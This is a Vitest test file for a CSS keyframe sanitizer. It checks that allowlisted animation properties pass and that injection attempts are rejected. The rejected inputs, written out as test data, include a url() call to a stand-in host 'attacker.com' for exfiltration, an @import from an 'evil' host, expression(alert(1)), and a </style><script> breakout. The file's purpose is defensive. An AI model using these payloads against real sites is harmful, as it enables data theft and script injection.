import { describe, it, expect } from "vitest";
import { sanitizeKeyframes } from "./sanitize_keyframes";

describe("sanitizeKeyframes — happy path", () => {
  it("accepts a simple opacity sweep", () => {
    const r = sanitizeKeyframes("0% { opacity: 0 } 100% { opacity: 1 }");
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.normalized).toBe("0% { opacity: 0 } 100% { opacity: 1 }");
    }
  });

  it("accepts `from` / `to` keywords", () => {
    const r = sanitizeKeyframes("from { opacity: 0 } to { opacity: 1 }");
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.normalized).toContain("from {");
      expect(r.normalized).toContain("to {");
    }
  });

  it("accepts multiple percent steps in one header", () => {
    const r = sanitizeKeyframes("0%, 100% { opacity: 1 } 50% { opacity: 0.5 }");
    expect(r.ok).toBe(true);
  });

  it("accepts every allowlisted property", () => {
    const r = sanitizeKeyframes(
      "0% { opacity: 0; transform: scale(0.8); filter: blur(2px); letter-spacing: 0.04em; color: #fe036d; background-color: rgba(0,0,0,0.5); border-color: #6bcd06; text-shadow: 0 0 8px #fff; box-shadow: 0 0 12px rgba(254,3,109,0.6) } 100% { opacity: 1 }",
    );
    expect(r.ok).toBe(true);
  });

  it("normalizes whitespace", () => {
    const r = sanitizeKeyframes("  0%   {  opacity:0  }  100%{opacity:1}  ");
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.normalized).toBe("0% { opacity: 0 } 100% { opacity: 1 }");
    }
  });

  it("normalizes property names + headers to lowercase", () => {
    const r = sanitizeKeyframes("0% { OPACITY: 0 } 100% { Opacity: 1 }");
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.normalized).toContain("opacity: 0");
      expect(r.normalized).toContain("opacity: 1");
    }
  });

  it("trims percent comma list spacing", () => {
    const r = sanitizeKeyframes("0%,50%, 100% { opacity: 1 }");
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.normalized).toBe("0%, 50%, 100% { opacity: 1 }");
    }
  });
});

describe("sanitizeKeyframes — attack: url() exfiltration", () => {
  it("rejects url() inside a step body", () => {
    const r = sanitizeKeyframes(
      "0% { background-color: url(http://attacker.com/exfil.gif) } 100% { opacity: 1 }",
    );
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toMatch(/url|forbidden/i);
  });

  it("rejects url() with whitespace before paren", () => {
    const r = sanitizeKeyframes("0% { color: url ('x') } 100% { opacity:1 }");
    expect(r.ok).toBe(false);
  });

  it("rejects URL() in any case", () => {
    const r = sanitizeKeyframes("0% { color: URL('x') } 100% { opacity:1 }");
    expect(r.ok).toBe(false);
  });
});

describe("sanitizeKeyframes — attack: expression()", () => {
  it("rejects IE6-style expression()", () => {
    const r = sanitizeKeyframes(
      "0% { color: expression(alert(1)) } 100% { opacity:1 }",
    );
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toMatch(/expression|forbidden/i);
  });
});

describe("sanitizeKeyframes — attack: at-rule injection", () => {
  it("rejects @import", () => {
    const r = sanitizeKeyframes(
      "0% { opacity: 0 } @import url('http://evil/x.css'); 100% { opacity: 1 }",
    );
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toMatch(/import|forbidden/i);
  });

  it("rejects @font-face", () => {
    const r = sanitizeKeyframes(
      "0% { opacity: 0 } @font-face { src: url('x') }",
    );
    expect(r.ok).toBe(false);
  });

  it("rejects @charset", () => {
    const r = sanitizeKeyframes("@charset 'utf-8'; 0% { opacity: 0 }");
    expect(r.ok).toBe(false);
  });

  it("rejects @media", () => {
    const r = sanitizeKeyframes("@media print { body{display:none} }");
    expect(r.ok).toBe(false);
  });

  it("rejects nested @keyframes", () => {
    const r = sanitizeKeyframes(
      "0% { opacity: 0 } @keyframes y { 0% { opacity: 0 } }",
    );
    expect(r.ok).toBe(false);
  });
});

describe("sanitizeKeyframes — attack: HTML / tag injection", () => {
  it("rejects </style> tag attempts", () => {
    const r = sanitizeKeyframes(
      "0% { opacity: 0 } </style><script>alert(1)</script> 100% { opacity: 1 }",
    );
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toMatch(/forbidden|invalid/i);
  });

  it("rejects raw < or > characters", () => {
    expect(sanitizeKeyframes("0% { opacity: 0 < 0.5 }").ok).toBe(false);
    expect(sanitizeKeyframes("0% { opacity: 0 } > 100% { opacity: 1 }").ok).toBe(false);
  });

  it("rejects backticks (template literal escape attempts)", () => {
    expect(
      sanitizeKeyframes("0% { color: `red` } 100% { opacity:1 }").ok,
    ).toBe(false);
  });
});

describe("sanitizeKeyframes — attack: property allowlist bypass", () => {
  it("rejects display:none", () => {
    const r = sanitizeKeyframes("0% { display: none } 100% { opacity:1 }");
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toMatch(/display.*allowlist|allowlist/i);
  });

  it("rejects width", () => {
    const r = sanitizeKeyframes("0% { width: 0 } 100% { width: 100% }");
    expect(r.ok).toBe(false);
  });

  it("rejects position", () => {
    const r = sanitizeKeyframes("0% { position: fixed } 100% { opacity:1 }");
    expect(r.ok).toBe(false);
  });

  it("rejects content (pseudo content stuffing)", () => {
    const r = sanitizeKeyframes("0% { content: 'x' } 100% { opacity:1 }");
    expect(r.ok).toBe(false);
  });

  it("rejects animation (chaining)", () => {
    const r = sanitizeKeyframes("0% { animation: x 1s } 100% { opacity:1 }");
    expect(r.ok).toBe(false);
  });

  it("rejects transition", () => {
    const r = sanitizeKeyframes(
      "0% { transition: all 1s } 100% { opacity:1 }",
    );
    expect(r.ok).toBe(false);
  });

  it("rejects --css-var", () => {
    const r = sanitizeKeyframes("0% { --foo: 1 } 100% { opacity:1 }");
    expect(r.ok).toBe(false);
  });
});

describe("sanitizeKeyframes — attack: shape / parser-state", () => {
  it("rejects empty string", () => {
    const r = sanitizeKeyframes("");
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toMatch(/empty/i);
  });

  it("rejects whitespace-only", () => {
    const r = sanitizeKeyframes("    \n\t   ");
    expect(r.ok).toBe(false);
  });

  it("rejects non-string types", () => {
    // @ts-expect-error testing invalid input shape
    expect(sanitizeKeyframes(null).ok).toBe(false);
    // @ts-expect-error testing invalid input shape
    expect(sanitizeKeyframes(123).ok).toBe(false);
    // @ts-expect-error testing invalid input shape
    expect(sanitizeKeyframes({}).ok).toBe(false);
  });

  it("rejects oversized body (>4096 chars)", () => {
    const big = "0% { opacity: 0 } ".repeat(500);
    const r = sanitizeKeyframes(big);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toMatch(/too long/i);
  });

  it("rejects unclosed step (missing })", () => {
    const r = sanitizeKeyframes("0% { opacity: 0 100% { opacity: 1 }");
    expect(r.ok).toBe(false);
    // The naive scanner detects the nested `{` first; either error
    // message is fine — both signal a parse failure.
    if (!r.ok) expect(r.error).toMatch(/missing|invalid|nested/i);
  });

  it("rejects step missing {", () => {
    const r = sanitizeKeyframes("0% opacity: 0 } 100% { opacity: 1 }");
    expect(r.ok).toBe(false);
  });

  it("rejects nested {", () => {
    const r = sanitizeKeyframes("0% { { opacity: 0 } } 100% { opacity:1 }");
    expect(r.ok).toBe(false);
  });

  it("rejects malformed step header", () => {
    const r = sanitizeKeyframes("notapct { opacity: 0 }");
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toMatch(/header|invalid/i);
  });

  it("rejects declaration without colon", () => {
    const r = sanitizeKeyframes("0% { opacity 0 } 100% { opacity:1 }");
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toMatch(/colon|missing/i);
  });

  it("rejects declaration without value", () => {
    const r = sanitizeKeyframes("0% { opacity: } 100% { opacity:1 }");
    expect(r.ok).toBe(false);
  });

  it("rejects backslash escapes", () => {
    const r = sanitizeKeyframes("0% { opacity: 0\\3a 0 } 100% { opacity:1 }");
    expect(r.ok).toBe(false);
  });
});

describe("sanitizeKeyframes — defence-in-depth", () => {
  it("rejects mixed valid + invalid (one bad property aborts)", () => {
    const r = sanitizeKeyframes(
      "0% { opacity: 0 } 50% { display: none } 100% { opacity: 1 }",
    );
    expect(r.ok).toBe(false);
  });

  it("returns specific property name in the error", () => {
    const r = sanitizeKeyframes(
      "0% { opacity: 0; display: none } 100% { opacity: 1 }",
    );
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toMatch(/display/);
  });
});
